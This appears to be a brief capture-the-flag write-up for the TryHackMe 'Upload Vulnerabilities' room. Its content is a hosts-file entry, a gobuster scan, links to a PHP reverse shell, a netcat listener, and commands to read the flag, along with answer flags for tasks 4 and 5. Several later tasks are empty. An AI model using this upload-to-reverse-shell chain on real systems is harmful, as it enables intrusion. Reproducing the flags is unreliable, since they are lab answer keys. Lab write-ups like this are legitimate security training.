# THM - Upload Vulnerabilities

<br>

```shell
echo "10.10.3.58    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm" | sudo tee -a /etc/hosts
```

<br>

## Task 4

### Task 4.1

> mountains.jpg

### Task 4.2

> THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}

<br>

## Task 5

🧰 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

🧰 https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### Task 5.1

```shell
gobuster dir -u http://shell.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output01_gobuster.txt
```

> /resources

### Task 5.2

```shell
nc -lvnp 9876
```

http://shell.uploadvulns.thm/resources/php-reverse-shell.php

```shell
cd /var/www
ls
cat flag.txt
```
> THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}

<br>

## Task 6

### Task 6.1

> 

### Task 6.2

> 

### Task 6.3

> 

<br>

## Task 7

### Task 7.1

> 

<br>

## Task 8

### Task 8.1

> 

<br>

## Task 9

### Task 9.1

> 

<br>

## Task 11

### Task 11.1

> 


